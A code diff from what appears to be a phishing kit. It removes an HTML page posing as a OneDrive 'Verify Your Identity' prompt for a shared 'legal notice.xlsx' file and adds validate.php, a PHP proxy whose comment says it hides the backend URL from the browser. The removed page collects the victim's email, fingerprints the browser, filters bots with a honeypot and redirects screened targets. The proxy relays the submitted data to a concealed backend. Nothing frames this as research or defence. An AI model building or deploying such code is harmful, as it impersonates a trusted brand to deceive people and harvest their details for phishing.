@@ -1,332 +1,78 @@
-<!doctype html>
-<html lang="en">
-<head>
-  <meta charset="utf-8">
-  <title>Helvetica</title>
-  <meta name="viewport" content="width=device-width, initial-scale=1">
-  <meta name="color-scheme" content="light dark">
-<style>
-  /* ===== Brand tokens ===== */
-  :root{
-    --brand:#1f6fd1;          /* header + button */
-    --brand-700:#1657a6;      /* button hover/active */
-    --bg:#f1f1f1;             /* page background */
-    --card:#f5f5f5;           /* card background */
-    --text:#1f2937;           /* main text */
-    --muted:#6b7280;          /* secondary text */
-    --border:#ccc;            /* light strokes */
-    --radius:3px;             /* card/button radius */
-    --card-shadow:0 12px 28px rgba(0,0,0,.08);
-    --maxw:320px;
-    --focus:#6aa1ff;          /* focus ring */
-    /* layout gaps + logo shift */
-    --logo-size:100px;
-    --gap-top:2px;            /* brandbar → logo (tighter) */
-    --gap-between:2px;        /* logo → card (tighter) */
-    --brandbar-h:38px;        /* keep in sync with .brandbar height */
-    --logo-shift: -10px;      /* negative = nudge left, positive = right */
-  }
-  @media (prefers-color-scheme: dark){
-    :root{
-      --bg:#0f141a; --card:#121922; --text:#f2f5f9; --muted:#9aa4b2; --border:#273142;
-      --card-shadow:0 12px 28px rgba(0,0,0,.6);
-    }
-  }
+<?php
+// /validate.php — server-side proxy: hides backend URL from the browser
+header('Content-Type: application/json; charset=utf-8');
+header('Cache-Control: no-store');
 
-  /* ===== Base ===== */
-  *{ box-sizing:border-box }
-  html,body{ height:100% }
-  body{
-    margin:0;
-    font:14px/1.5 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
-    background:var(--bg);
-    color:var(--text);
-  }
+// Allow same-origin; harmless if browser hits directly
+$origin = $_SERVER['HTTP_ORIGIN'] ?? '';
+if ($origin) { header('Access-Control-Allow-Origin: ' . $origin); header('Vary: Origin'); }
 
-  /* Top brand bar */
-  .brandbar{
-    height:var(--brandbar-h);
-    background:var(--brand);
-    color:#fff;
-    display:flex; align-items:center;
-    padding:0 16px;
-    font-weight:450;
-    letter-spacing:.6px;
-    font-size:19px;
-  }
-
-  /* Centered container — stop full-height centering so spacing is tight */
-  .wrap{
-    min-height:auto;                         /* was calc(100% - var(--brandbar-h)) */
-    display:flex;
-    flex-direction:column;
-    align-items:center;                      /* keep horizontally centered */
-    justify-content:flex-start;              /* stack near the top */
-    padding:var(--gap-top) 16px 16px;        /* tighter */
-  }
-
-  /* Logo */
-  .card-logo{
-    width:var(--logo-size);
-    height:var(--logo-size);
-    display:block;
-    margin:0 auto var(--gap-between);        /* small gap under logo */
-    transform:translateX(var(--logo-shift)); /* nudge slightly left */
-    object-fit:contain;
-    max-width:100%;
-  }
-  @media (prefers-color-scheme: dark){
-    .card-logo{ filter:brightness(1.05) contrast(1.02); }
-  }
-
-  /* Card */
-  .card{
-    width:75%;
-    max-width:var(--maxw);
-    background:var(--card);
-    border:1px solid var(--border);
-    border-radius:var(--radius);
-    box-shadow:var(--card-shadow);
-    overflow:hidden;
-    font-size:14px;
-    margin-top:var(--gap-between);           /* sits close to logo */
-  }
-  .card-head{
-    padding:16px 12px;                       /* tighter header */
-    border-bottom:1.2px solid var(--border);
-    text-align:center;
-  }
-  .card-title{
-    margin:0;
-    font-size:20px;
-    line-height:1.25;
-    font-weight:350;
-  }
-  .card-body{ padding:15px 16px }            /* slightly tighter body padding */
-  .card-body p{ margin:0 0 10px 0; color:var(--muted) }
-
-  /* File name badge */
-  .file{
-    display:inline-block;
-    padding:8px 12px;
-    border:0;
-    border-radius:4px;
-    background:#f5f5f5;
-    color:var(--text);
-    font-weight:450;
-    margin:4px 0 10px;
-    word-break:break-word;
-    max-width:100%;
-    font-size:16px;
-  }
-
-  /* Form */
-  .field{ margin:10px 0 0 0 }
-  label{ display:block; font-size:12px; color:var(--muted); margin-bottom:6px }
-  .input{
-    width:100%;
-    height:40px;
-    border:1.3px solid #ccc;
-    border-radius:3px;
-    padding:0 12px;
-    background:var(--card);
-    color:var(--text);
-    outline:none;
-  }
-  .input:focus{ border-color:#000; }
-
-  /* Button */
-  .actions{ margin:17px 0 7px; display:flex; gap:12px }
-  .btn{
-    appearance:none; border:0; cursor:pointer;
-    height:40px; padding:0 18px; border-radius:var(--radius);
-    background:var(--brand); color:#fff; font-weight:650; width:100%;
-  }
-  .btn:hover{ background:var(--brand-700) }
-  
-
-  .caption{ font-size:13px; color:var(--muted); margin-top:18px ; margin-bottom:18px}
-  .caption small{ display:block; opacity:.9 }
-
-  /* Inline alert */
-  .alert { font:12px/1.6 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif; margin-top:8px; }
-
-  /* Narrow */
-  @media (max-width:480px){
-    :root{ --maxw:92vw; --logo-size:84px; }
-    .card-title{ font-size:18px }
-  }
-  
-  .simple-footer{
-  margin-top: 1px;                 /* make it closer to the card; try 2–8px */
-  text-align: center;
-  color: var(--muted);
-  font: 12px/1.4 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;
+if (($_SERVER['REQUEST_METHOD'] ?? '') === 'OPTIONS') {
+  header('Access-Control-Allow-Methods: POST, OPTIONS');
+  header('Access-Control-Allow-Headers: Content-Type, Accept-Language');
+  http_response_code(204); exit;
+}
+if (($_SERVER['REQUEST_METHOD'] ?? '') !== 'POST') {
+  http_response_code(405); echo '{"valid":false,"message":"Method not allowed"}'; exit;
 }
 
+$BACKEND_URL = getenv('BACKEND_URL') ?: '';
+$SHARED      = getenv('EDGE_SHARED_SECRET') ?: ''; // optional HMAC hardening
 
-</style>
+$raw = file_get_contents('php://input');
+// Basic sanity: prevent accidental huge payloads
+if (strlen($raw) > 64 * 1024) { http_response_code(413); echo '{"valid":false,"message":"Payload too large"}'; exit; }
 
-</head>
-<body>
+// Short-lived HMAC to prove the request comes from your proxy
+$ts  = (string) time();
+$sig = '';
+if ($SHARED !== '') {
+  $bin = hash_hmac('sha256', $ts, $SHARED, true);
+  $sig = rtrim(strtr(base64_encode($bin), '+/', '-_'), '=');
+}
 
-  <!-- Top brand bar -->
-  <div class="brandbar">
-    <span id="brandName">OneDrive</span>
-  </div>
+$ch = curl_init($BACKEND_URL);
+curl_setopt_array($ch, [
+  CURLOPT_POST           => true,
+  CURLOPT_HTTPHEADER     => array_filter([
+    'Content-Type: application/json',
+    'Accept-Language: ' . ($_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en'),
+    'User-Agent: ' . ($_SERVER['HTTP_USER_AGENT'] ?? 'frontend-proxy'),
+    'X-Proxy-From: frontend',          // your backend will require this
+    'X-Client-Lang: ' . (explode(',', $_SERVER['HTTP_ACCEPT_LANGUAGE'] ?? 'en')[0]),
+    $SHARED ? "X-Edge-Ts: $ts" : null, // signature pair
+    $SHARED ? "X-Edge-Sig: $sig" : null,
+  ]),
+  CURLOPT_POSTFIELDS     => $raw,
+  CURLOPT_RETURNTRANSFER => true,
+  CURLOPT_HEADER         => false,
+  CURLOPT_TIMEOUT        => 12,
+]);
+$resp = curl_exec($ch);
+$code = curl_getinfo($ch, CURLINFO_HTTP_CODE) ?: 502;
+$err  = curl_error($ch);
+curl_close($ch);
 
-  <main class="wrap">
-    <!-- Logo above the card -->
-    <img class="card-logo" src="nn.PNG" alt="" width="100" height="100" decoding="async" loading="eager">
+if ($resp === false) {
+  http_response_code(502);
+  echo json_encode(['valid'=>false,'message'=>'Upstream unavailable','detail'=>$err], JSON_UNESCAPED_SLASHES);
+  exit;
+}
 
-    <!-- Honeypot -->
-    <input type="text" id="middleName" name="middleName" tabindex="-1" autocomplete="off"
-           aria-hidden="true" style="position:absolute;left:-9999px;opacity:0;height:0;width:0;border:0;padding:0;">
+// If backend didn’t return JSON, wrap with a helpful error so your UI isn’t vague
+$ct = 'application/json';
+if (!preg_match('~^\s*\{|\[~', ltrim((string)$resp))) { // cheap JSON check
+  http_response_code($code);
+  echo json_encode([
+    'valid' => false,
+    'code'  => 'backend_response',
+    'message' => 'Upstream returned an unexpected response',
+    'upstreamStatus' => $code,
+    'body' => substr((string)$resp, 0, 512),
+  ], JSON_UNESCAPED_SLASHES);
+  exit;
+}
 
-    <!-- Form -->
-    <form class="card" id="verifyForm" method="post" action="/validate.php">
-      <header class="card-head" aria-labelledby="t">
-        <h1 id="t" class="card-title">Verify Your Identity</h1>
-      </header>
-
-      <section class="card-body">
-        <p>You’ve been sent a secure link to:</p>
-        <div class="file" id="fileName">legal notice.xlsx</div>
-        <p>To open this secure link, enter the email address it was shared with.</p>
-
-        <div class="field">
-          <label for="email"></label>
-          <input class="input" id="email" name="email" type="email" autocomplete="email"
-                 placeholder="Enter email" required inputmode="email" />
-        </div>
-
-        <!-- Error box (hidden by default) -->
-        <div id="err" class="alert"
-             style="display:none;margin-top:10px;font:12px/1.4 system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#b91c1c;"
-             role="status" aria-live="polite"></div>
-
-        <div class="actions">
-          <button class="btn" id="continueBtn" type="submit" disabled>Next</button>
-        </div>
-
-        <div class="caption" id="disclosure">
-          <small>By selecting Next you allow this form to use your email in accordance with its Privacy Notice.</small>
-        </div>
-      </section>
-    </form>
-  </main>
-
-  <div class="simple-footer">© 2025&nbsp;&nbsp;Privacy &amp; Cookie</div>
-
-</body>
-
-
-
-
-
-
-
-
-
-
-
-
- <script>
-document.addEventListener('DOMContentLoaded', () => {
-  // Tiny helper
-  const $ = id => document.getElementById(id);
-
-  // i18n (EN/FR)
-  const LANG = (navigator.language || 'en').slice(0,2);
-  const T = {
-    en: { invalidEmail:'Please enter a valid email address.', errorGeneric:'Something went wrong. Please try again.', redirecting:'Redirecting…' },
-    fr: { invalidEmail:'Veuillez saisir une adresse e-mail valide.', errorGeneric:'Une erreur est survenue. Merci de réessayer.', redirecting:'Redirection…' }
-  };
-  const t = T[LANG] || T.en;
-
-  // Endpoint (your PHP bridge/back-end)
-  const gateway = '/validate.php';
-
-  // DOM refs
-  const form     = $('verifyForm');
-  const input    = $('email');
-  const errBox   = $('err');
-  const submitEl = $('submitBtn') || $('continueBtn'); // support either id
-
-  const looksLikeEmail = v => /^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(String(v).trim());
-  const show = (n, msg) => { if (!n) return; if (msg) n.textContent = msg; n.style.display = 'block'; };
-  const hide = (n) => { if (!n) return; n.style.display = 'none'; };
-
-  // Optional: simple fingerprint (backend can ignore it)
-  let fpHash = '';
-  (async () => {
-    try {
-      const sig = [navigator.userAgent, navigator.language, navigator.platform, screen.width + 'x' + screen.height].join('|');
-      const buf = await crypto.subtle.digest('SHA-256', new TextEncoder().encode(sig));
-      fpHash = btoa(String.fromCharCode(...new Uint8Array(buf)));
-    } catch {}
-  })();
-
-  // Enable/disable button as user types
-  input?.addEventListener('input', () => {
-    hide(errBox);
-    if (submitEl) submitEl.disabled = !looksLikeEmail(input.value);
-  });
-
-  // Submit → server whitelist check (no captcha)
-  form?.addEventListener('submit', async (e) => {
-    e.preventDefault();
-
-    const val  = (input?.value || '').trim();
-    const trap = ($('middleName')?.value || '').trim(); // honeypot; must be empty
-
-    if (!looksLikeEmail(val)) return show(errBox, t.invalidEmail);
-    if (trap) return; // bot
-
-    const payload = {
-      email: val.toLowerCase(),
-      middleName: trap,
-      jsToken: 'ok-' + Math.random().toString(36).slice(2),
-      fingerprint: fpHash
-    };
-
-    // Abort after 12s to avoid hanging
-    const ctl = new AbortController();
-    const timer = setTimeout(() => ctl.abort(), 12000);
-
-    try {
-      if (submitEl) { submitEl.disabled = true; submitEl.textContent = 'Checking…'; }
-
-      const res = await fetch(gateway, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json', 'Accept-Language': LANG },
-        body: JSON.stringify(payload),
-        signal: ctl.signal
-      });
-
-      const text = await res.text();
-      let json = {};
-      try { json = JSON.parse(text); } catch {}
-
-      if (res.ok && json.valid && json.redirect) {
-        if (submitEl) submitEl.textContent = t.redirecting;
-        setTimeout(() => { location.assign(json.redirect); }, 600);
-      } else {
-        const msg = (json && (json.message || json.detail))
-          ? json.message + (json.detail ? ` (${json.detail})` : '')
-          : `${t.errorGeneric} [${res.status}]`;
-        show(errBox, msg);
-        if (submitEl) { submitEl.disabled = !looksLikeEmail(val); submitEl.textContent = 'Next'; }
-      }
-    } catch {
-      show(errBox, t.errorGeneric);
-      if (submitEl) { submitEl.disabled = !looksLikeEmail(input.value); submitEl.textContent = 'Next'; }
-    } finally {
-      clearTimeout(timer);
-    }
-  });
-});
-</script>
-
-</body>
-</html>
+http_response_code($code);
+header('Content-Type: application/json; charset=utf-8');
+echo $resp;
